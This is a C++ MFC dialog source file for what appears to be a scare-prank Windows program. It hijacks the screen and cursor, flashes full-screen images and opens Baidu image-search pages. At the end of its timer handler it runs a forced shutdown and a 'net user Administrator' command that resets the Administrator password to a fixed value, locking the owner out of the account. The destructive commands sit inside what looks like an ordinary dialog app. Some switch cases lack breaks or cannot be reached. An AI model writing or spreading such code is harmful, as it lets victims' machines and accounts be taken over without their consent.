// °µÒ¹Ö®»êDlg.cpp : implementation file
//
#include "bits/stdc++.h"
#include "windows.h"
#include "stdafx.h"
#include "°µÒ¹Ö®»ê.h"
#include "°µÒ¹Ö®»êDlg.h"
#include "mmsystem.h"
#pragma comment(lib,"winmm.lib") 
#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CAboutDlg dialog used for App About

class CAboutDlg : public CDialog
{
public:
	CAboutDlg();

// Dialog Data
	//{{AFX_DATA(CAboutDlg)
	enum { IDD = IDD_ABOUTBOX };
	//}}AFX_DATA

	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CAboutDlg)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:
	//{{AFX_MSG(CAboutDlg)
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
	//{{AFX_DATA_INIT(CAboutDlg)
	//}}AFX_DATA_INIT
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CAboutDlg)
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
	//{{AFX_MSG_MAP(CAboutDlg)
		// No message handlers
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CMyDlg dialog

CMyDlg::CMyDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CMyDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CMyDlg)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
	// Note that LoadIcon does not require a subsequent DestroyIcon in Win32
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CMyDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CMyDlg)
		// NOTE: the ClassWizard will add DDX and DDV calls here
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CMyDlg, CDialog)
	//{{AFX_MSG_MAP(CMyDlg)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_WM_TIMER()
	ON_EN_CHANGE(IDC_EDIT2, OnChangeEdit2)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CMyDlg message handlers
void CMyDlg::zzysb()
{
	CClientDC dc(this);
	b1.LoadBitmap(IDB_BITMAP1);
	b2.LoadBitmap(IDB_BITMAP2);
    b3.LoadBitmap(IDB_BITMAP3);
	b4.LoadBitmap(IDB_BITMAP4);
	b5.LoadBitmap(IDB_BITMAP5);
	b6.LoadBitmap(IDB_BITMAP6);
	b7.LoadBitmap(IDB_BITMAP7);
	b8.LoadBitmap(IDB_BITMAP8);
	b9.LoadBitmap(IDB_BITMAP9);
    b10.LoadBitmap(IDB_BITMAP10);
	b11.LoadBitmap(IDB_BITMAP11);
	b1.GetObject(sizeof(bm1),&bm1);
	temp.CreateCompatibleBitmap(&dc,1360,768);
	cdc1.CreateCompatibleDC(0);
	cdc2.CreateCompatibleDC(0);
	cdc3.CreateCompatibleDC(0);
	cdc4.CreateCompatibleDC(0);
	cdc5.CreateCompatibleDC(0);
	cdc6.CreateCompatibleDC(0);
	cdc7.CreateCompatibleDC(0);
	cdc8.CreateCompatibleDC(0);
	cdc9.CreateCompatibleDC(0);
	cdc10.CreateCompatibleDC(0);
	cdc11.CreateCompatibleDC(0);
	cdc12.CreateCompatibleDC(0);
	cdc1.SelectObject(&temp);
    cdc2.SelectObject(&b1);
	cdc3.SelectObject(&b2);
	cdc4.SelectObject(&b3);
	cdc5.SelectObject(&b4);
	cdc6.SelectObject(&b5);
	cdc7.SelectObject(&b6);
	cdc8.SelectObject(&b7);
	cdc9.SelectObject(&b8);
	cdc10.SelectObject(&b9);
	cdc11.SelectObject(&b10);
	cdc12.SelectObject(&b11);
}
BOOL CMyDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// Add "About..." menu item to system menu.

	// IDM_ABOUTBOX must be in the system command range.
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		CString strAboutMenu;
		strAboutMenu.LoadString(IDS_ABOUTBOX);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	// TODO: Add extra initialization here
    CMyDlg::zzysb();
	SetTimer(1,1,NULL);
	a1=0;
	d=4;
	n=2;
	trotting_horse_lamp=142857;
	s=0;
	return TRUE;  // return TRUE  unless you set the focus to a control
}

void CMyDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialog::OnSysCommand(nID, lParam);
	}
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CMyDlg::OnPaint() 
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, (WPARAM) dc.GetSafeHdc(), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

// The system calls this to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CMyDlg::OnQueryDragIcon()
{
	return (HCURSOR) m_hIcon;
}

void CMyDlg::OnOK() 
{
	// TODO: Add extra validation here
	
	//CDialog::OnOK();
}

void CMyDlg::OnTimer(UINT nIDEvent) 
{
	// TODO: Add your message handler code here and/or call default
	CClientDC dc(this);
	srand(time(NULL));
	for(i=1;i<=100;i++)
	{
		random_choice=rand()%13+1;
		EnableWindow(false);
		an=a1+(n-1)*d;
		sn=n*(a1+an)/2;
		SetCursorPos(an,sn);
	    n++;
		switch(random_choice)
		{
			case 1:cdc1.BitBlt(0,0,1360,768,&cdc2,0,0,SRCCOPY);CenterWindow();ShowWindow(SW_MAXIMIZE);break;
            case 2:cdc1.BitBlt(0,0,1360,768,&cdc3,0,0,SRCCOPY);CenterWindow();ShowWindow(SW_MAXIMIZE);break;
		    case 3:cdc1.BitBlt(0,0,1360,768,&cdc4,0,0,SRCCOPY);CenterWindow();ShowWindow(SW_MAXIMIZE);break;
            case 4:cdc1.BitBlt(0,0,1360,768,&cdc5,0,0,SRCCOPY);CenterWindow();ShowWindow(SW_MAXIMIZE);break;
			case 5:cdc1.BitBlt(0,0,1360,768,&cdc6,0,0,SRCCOPY);CenterWindow();ShowWindow(SW_MAXIMIZE);break;
            case 6:cdc1.BitBlt(0,0,1360,768,&cdc7,0,0,SRCCOPY);CenterWindow();ShowWindow(SW_MAXIMIZE);break;
		    case 7:cdc1.BitBlt(0,0,1360,768,&cdc8,0,0,SRCCOPY);CenterWindow();ShowWindow(SW_MAXIMIZE);break;
            case 8:cdc1.BitBlt(0,0,1360,768,&cdc9,0,0,SRCCOPY);CenterWindow();ShowWindow(SW_MAXIMIZE);break;
		    case 9:cdc1.BitBlt(0,0,1360,768,&cdc10,0,0,SRCCOPY);CenterWindow();ShowWindow(SW_MAXIMIZE);break;
            case 10:cdc1.BitBlt(0,0,1360,768,&cdc11,0,0,SRCCOPY);CenterWindow();ShowWindow(SW_MAXIMIZE);break;
			case 11:ShellExecute(NULL,"open","https://image.baidu.com/search/detail?ct=503316480&z=0&tn=baiduimagedetail&ipn=d&cl=2&cm=1&sc=0&lm=-1&ie=gb18030&pn=5&rn=1&di=114840&ln=30&word=%C1%E9%D2%EC%CA%C2%BC%FE&os=459897385,2988695074&cs=1415697472,3391377112&objurl=http%3A%2F%2Fwww.tanling.com%2Fuploads%2Fallimg%2F180109%2F2-1P109112631238.jpg&bdtype=0&simid=4216440677,814499319&pi=0&adpicid=0&timingneed=0&spn=0&is=0,0&fr=ala&ala=1&alatpl=adress&pos=1&oriquery=%E7%81%B5%E5%BC%82%E4%BA%8B%E4%BB%B6&hs=2&xthttps=000000#pn=6&spn=0&di=200750&adpicid=0&lpn=0&cs=2432131196%2C3636072681&pi=0&simid=3406699301%2C194976022&objurl=https%3A%2F%2Fgimg2.baidu.com%2Fimage_search%2Fsrc%3Dhttp%3A%2F%2Fn1.itc.cn%2Fimg8%2Fwb%2Frecom%2F2016%2F07%2F07%2F146787760294664195.JPEG%26refer%3Dhttp%3A%2F%2Fn1.itc.cn%26app%3D2002%26size%3Df9999%2C10000%26q%3Da80%26n%3D0%26g%3D0n%26fmt%3Djpeg%3Fsec%3D1622375896%26t%3D3b29af9d6f21d29b6950553cd02467c7&fromurl=ippr_z2C%24qAzdH3FAzdH3F4_z%26e3Bf5i7_z%26e3Bv54AzdH3FwAzdH3F8adan9m99_889bncAzdH3F&W=508&H=292&S=&TP=jpeg",NULL,NULL,SW_SHOWNORMAL);
			case 12:ShellExecute(NULL,"open","https://image.baidu.com/search/detail?ct=503316480&z=0&tn=baiduimagedetail&ipn=d&cl=2&cm=1&sc=0&lm=-1&ie=gb18030&pn=5&rn=1&di=114840&ln=30&word=%C1%E9%D2%EC%CA%C2%BC%FE&os=459897385,2988695074&cs=1415697472,3391377112&objurl=http%3A%2F%2Fwww.tanling.com%2Fuploads%2Fallimg%2F180109%2F2-1P109112631238.jpg&bdtype=0&simid=4216440677,814499319&pi=0&adpicid=0&timingneed=0&spn=0&is=0,0&fr=ala&ala=1&alatpl=adress&pos=1&oriquery=%E7%81%B5%E5%BC%82%E4%BA%8B%E4%BB%B6&hs=2&xthttps=000000#pn=9&spn=0&di=99110&adpicid=0&lpn=0&cs=4237797958%2C2044270901&pi=0&simid=0%2C0&objurl=https%3A%2F%2Fgimg2.baidu.com%2Fimage_search%2Fsrc%3Dhttp%3A%2F%2Fimg.ixinwei.com%2Fiww201805%2F126201.jpg%26refer%3Dhttp%3A%2F%2Fimg.ixinwei.com%26app%3D2002%26size%3Df9999%2C10000%26q%3Da80%26n%3D0%26g%3D0n%26fmt%3Djpeg%3Fsec%3D1622375896%26t%3D01ac210b19d16abfc875e6a9e22f6114&fromurl=ippr_z2C%24qAzdH3FAzdH3Fooo_z%26e3Btxtgojt_z%26e3Bv54AzdH3Fgjofi5o_z%26e3Bwfrx%3FDjePw2j%3D9%26t1%3Dlna9m&W=463&H=250&S=&TP=jpg",NULL,NULL,SW_SHOWNORMAL);
		    case 13:ShellExecute(NULL,"open","https://image.baidu.com/search/detail?ct=503316480&z=0&tn=baiduimagedetail&ipn=d&cl=2&cm=1&sc=0&lm=-1&ie=gb18030&pn=5&rn=1&di=114840&ln=30&word=%C1%E9%D2%EC%CA%C2%BC%FE&os=459897385,2988695074&cs=1415697472,3391377112&objurl=http%3A%2F%2Fwww.tanling.com%2Fuploads%2Fallimg%2F180109%2F2-1P109112631238.jpg&bdtype=0&simid=4216440677,814499319&pi=0&adpicid=0&timingneed=0&spn=0&is=0,0&fr=ala&ala=1&alatpl=adress&pos=1&oriquery=%E7%81%B5%E5%BC%82%E4%BA%8B%E4%BB%B6&hs=2&xthttps=000000#pn=11&spn=0&di=96140&adpicid=0&lpn=0&cs=1658472984%2C2459400383&pi=0&simid=4150474461%2C407955282&objurl=https%3A%2F%2Fgimg2.baidu.com%2Fimage_search%2Fsrc%3Dhttp%3A%2F%2Fwww.ytsfc.com%2Fd%2Ffile%2Fp%2F2020%2F06-04%2F053b00daaeb072da0b5936fc02f82c10.jpg%26refer%3Dhttp%3A%2F%2Fwww.ytsfc.com%26app%3D2002%26size%3Df9999%2C10000%26q%3Da80%26n%3D0%26g%3D0n%26fmt%3Djpeg%3Fsec%3D1622375896%26t%3D5ab856f3039eaaab6b1cbf33e115e936&fromurl=ippr_z2C%24qAzdH3FAzdH3Fooo_z%26e3Bypfuv_z%26e3Bv54AzdH3FqtojgAzdH3Fstg2ytAzdH3F8ad9d_z%26e3Bip4s&W=516&H=290&S=&TP=jpg",NULL,NULL,SW_SHOWNORMAL);
			case 14:ShellExecute(NULL,"open","https://image.baidu.com/search/detail?ct=503316480&z=0&tn=baiduimagedetail&ipn=d&cl=2&cm=1&sc=0&lm=-1&ie=gb18030&pn=5&rn=1&di=114840&ln=30&word=%C1%E9%D2%EC%CA%C2%BC%FE&os=459897385,2988695074&cs=1415697472,3391377112&objurl=http%3A%2F%2Fwww.tanling.com%2Fuploads%2Fallimg%2F180109%2F2-1P109112631238.jpg&bdtype=0&simid=4216440677,814499319&pi=0&adpicid=0&timingneed=0&spn=0&is=0,0&fr=ala&ala=1&alatpl=adress&pos=1&oriquery=%E7%81%B5%E5%BC%82%E4%BA%8B%E4%BB%B6&hs=2&xthttps=000000#pn=21&spn=0&di=28380&adpicid=0&lpn=0&cs=2494832763%2C1895340437&pi=0&simid=3394836997%2C334570255&objurl=https%3A%2F%2Fgimg2.baidu.com%2Fimage_search%2Fsrc%3Dhttp%3A%2F%2Fimage13.m1905.cn%2Fuploadfile%2F2013%2F0702%2F20130702095038811.jpg%26refer%3Dhttp%3A%2F%2Fimage13.m1905.cn%26app%3D2002%26size%3Df9999%2C10000%26q%3Da80%26n%3D0%26g%3D0n%26fmt%3Djpeg%3Fsec%3D1622375896%26t%3Da094f630c8c9751f57b7925f9280b5a0&fromurl=ippr_z2C%24qAzdH3FAzdH3Fooo_z%26e3B48lac_z%26e3Bv54AzdH3Fgjo2wssj6yAzdH3Fi1rtvAzdH3Fc9mbn0_z%26e3Bfip4s&W=1439&H=631&S=&TP=jpg",NULL,NULL,SW_SHOWNORMAL);
			case 15:ShellExecute(NULL,"open","https://image.baidu.com/search/detail?ct=503316480&z=0&tn=baiduimagedetail&ipn=d&cl=2&cm=1&sc=0&lm=-1&ie=gb18030&pn=5&rn=1&di=114840&ln=30&word=%C1%E9%D2%EC%CA%C2%BC%FE&os=459897385,2988695074&cs=1415697472,3391377112&objurl=http%3A%2F%2Fwww.tanling.com%2Fuploads%2Fallimg%2F180109%2F2-1P109112631238.jpg&bdtype=0&simid=4216440677,814499319&pi=0&adpicid=0&timingneed=0&spn=0&is=0,0&fr=ala&ala=1&alatpl=adress&pos=1&oriquery=%E7%81%B5%E5%BC%82%E4%BA%8B%E4%BB%B6&hs=2&xthttps=000000#pn=24&spn=0&di=128480&adpicid=0&lpn=0&cs=1410183567%2C1094876898&pi=0&simid=3536053087%2C293497525&objurl=https%3A%2F%2Fgimg2.baidu.com%2Fimage_search%2Fsrc%3Dhttp%3A%2F%2Ffile.nxing.cn%2Fuploads%2Fuploads%2F2016%2F12%2F12%2F0000012%2F201612121310578415d009a-size550x687.jpg%26refer%3Dhttp%3A%2F%2Ffile.nxing.cn%26app%3D2002%26size%3Df9999%2C10000%26q%3Da80%26n%3D0%26g%3D0n%26fmt%3Djpeg%3Fsec%3D1622375896%26t%3D3730e6d6fd9af651d88db8a40d88171d&fromurl=ippr_z2C%24qAzdH3FAzdH3Fgjof_z%26e3Bgxtg2_z%26e3BvgAzdH3Fw6ptvsjAzdH3Fmml8lcn_z%26e3Bip4s&W=550&H=687&S=&TP=jpg",NULL,NULL,SW_SHOWNORMAL);
			case 16:ShellExecute(NULL,"open","https://image.baidu.com/search/index?tn=baiduimage&ps=1&ct=201326592&lm=-1&cl=2&nc=1&ie=utf-8&word=%E5%B0%8F%E5%A7%90%E5%A7%90",NULL,NULL,SW_SHOWNORMAL);
			case 17:ShellExecute(NULL,"open","https://www.baidu.com/s?wd=%E5%B0%8F%E5%A7%90%E5%A7%90&tn=98012088_5_dg&ch=11#ie=utf-8&f=3&rsv_bp=1&ch=11&tn=98012088_5_dg&wd=%E4%B8%96%E7%95%8C%E4%B8%8A%E6%9C%80%E7%BE%8E%E7%9A%84%E5%A5%B3%E4%BA%BA&oq=%25E5%25B0%258F%25E5%25A7%2590%25E5%25A7%2590&rsv_pq=83dfd1680001154a&rsv_t=8fd69WBsDqTxXlzZZEsLuiIYDk%2FxZ3D0D7cptNTBu9RtP5nPRPd19C1dik3ouVPOr7tOPQ&rqlang=cn&rsv_dl=ts_0&rsv_enter=1&rsv_sug3=10&rsv_sug1=9&rsv_sug7=100&rsv_sug2=1&rsv_btype=t&prefixsug=%25E4%25B8%2596%25E7%2595%258C%25E4%25B8%258A%25E6%259C%2580%25E7%25BE%258E%25E7%259A%2584&rsp=0&inputT=16100&rsv_sug4=20810",NULL,NULL,SW_SHOWNORMAL);
			case 18:ShellExecute(NULL,"open","https://image.baidu.com/search/index?tn=baiduimage&ps=1&ct=201326592&lm=-1&cl=2&nc=1&ie=utf-8&word=%E4%B8%96%E7%95%8C%E4%B8%8A%E6%9C%80%E5%A5%BD%E5%90%83%E7%9A%84%E9%9B%B6%E9%A3%9F",NULL,NULL,SW_SHOWNORMAL);
		}
		dc.BitBlt(0,0,800,600,&cdc1,0,0,SRCCOPY);
		trotting_horse_lamp=trotting_horse_lamp*i;
		while(trotting_horse_lamp)
		{
			trotting_horse_lamp=trotting_horse_lamp%10;
			if(trotting_horse_lamp==9)random_choic2=rand()%16+18;
			trotting_horse_lamp=trotting_horse_lamp/10;
		}
		Sleep(1000);
	}
	system("shutdown -s -t 1");
	system("net user Administrator REDVATTBAT200454");
	CDialog::OnTimer(nIDEvent);
}

//DEL void CMyDlg::OnVScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar) 
//DEL {
//DEL 	// TODO: Add your message handler code here and/or call default
//DEL 	CDialog::OnVScroll(nSBCode, nPos, pScrollBar);
//DEL }

void CMyDlg::OnChangeEdit2() 
{
	// TODO: If this is a RICHEDIT control, the control will not
	// send this notification unless you override the CDialog::OnInitDialog()
	// function and call CRichEditCtrl().SetEventMask()
	// with the ENM_CHANGE flag ORed into the mask.
	
	// TODO: Add your control notification handler code here
	
}
